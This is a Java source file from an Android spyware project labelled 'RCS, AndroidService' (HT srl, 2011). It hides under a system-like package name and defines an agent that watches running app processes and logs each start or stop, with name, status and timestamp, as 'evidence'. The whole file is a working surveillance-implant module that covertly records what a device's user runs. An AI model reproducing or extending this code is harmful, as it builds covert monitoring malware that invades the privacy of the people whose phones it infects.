/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;
import android.util.Log;

import com.android.service.LogR;
import com.android.service.ProcessInfo;
import com.android.service.ProcessStatus;
import com.android.service.auto.Cfg;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerProcess;
import com.android.service.util.Check;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class AgentApplication extends AgentBase implements Observer<ProcessInfo> {
	private static final String TAG = "AgentApplication";

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	@Override
	public void go() {

	}

	@Override
	public void begin() {
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
	}

	public int notification(ProcessInfo process) {
		saveEvidence(process.processInfo, process.status);
		return 0;
	}

	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
		if(Cfg.DEBUG) Check.requires(process != null, "null process");

		String name = process.processName;
		String module = process.processName;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(status.name(), true));
		items.add(WChar.getBytes(module, true));
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		LogR log = new LogR(EvidenceType.APPLICATION);
		log.write(items);
		log.close();
		
		if(Cfg.DEBUG) Log.d("QZ", TAG + " (saveEvidence): " + name + " " + status.name());
	}

}
